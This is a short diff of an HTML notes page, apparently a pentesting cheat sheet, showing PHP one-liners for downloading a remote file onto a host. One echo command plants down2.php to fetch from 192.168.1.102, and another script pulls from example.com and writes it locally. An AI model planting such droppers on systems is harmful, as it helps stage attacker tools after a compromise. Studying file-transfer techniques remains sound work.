@@ -4,4 +4,11 @@
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Php</title>
 </head><body>echo "&lt;?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?&gt;" &gt; down2.php <br/>
-</body></html>
+<br/>
+<br/>
+<br/>
+<br/>
+#!/usr/bin/php <br/>
+&lt;?php &nbsp; &nbsp; &nbsp; &nbsp; $data = @file("http://example.com/file"); &nbsp; &nbsp; &nbsp; &nbsp; $lf = "local_file"; &nbsp; &nbsp; &nbsp; &nbsp; $fh = fopen($lf, 'w'); &nbsp; &nbsp; &nbsp; &nbsp; fwrite($fh, $data[0]); &nbsp; &nbsp; &nbsp; &nbsp; fclose($fh); ?&gt;<br/>
+<br/>
+php test.php</body></html>
